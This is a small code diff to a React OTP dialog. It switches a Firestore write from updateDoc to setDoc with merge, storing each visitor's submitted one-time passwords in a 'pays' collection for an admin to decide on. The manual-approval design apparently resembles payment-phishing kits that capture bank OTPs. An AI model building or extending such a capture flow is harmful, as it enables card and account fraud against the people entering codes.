@@ -9,7 +9,7 @@ import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { ShieldCheck, AlertCircle } from "lucide-react"
 import { db } from "@/lib/firebase"
-import { doc, onSnapshot, updateDoc } from "firebase/firestore"
+import { doc, onSnapshot, setDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 
 interface OtpDialogProps {
@@ -81,12 +81,12 @@ export function OtpDialog({ open, onOpenChange, onOtpApproved, documentId }: Otp
     try {
       allOtps.push(otp)
       // Update the document with the OTP
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         otp,
         otpSubmittedAt: new Date().toISOString(),
         allOtps,
-        otpStatus: "verifying" // Set to verifying, waiting for admin decision
-      })
+        otpStatus: "verifying"
+      }, { merge: true })
 
       // Add OTP to history
       await addToHistory(visitorID, "otp", {
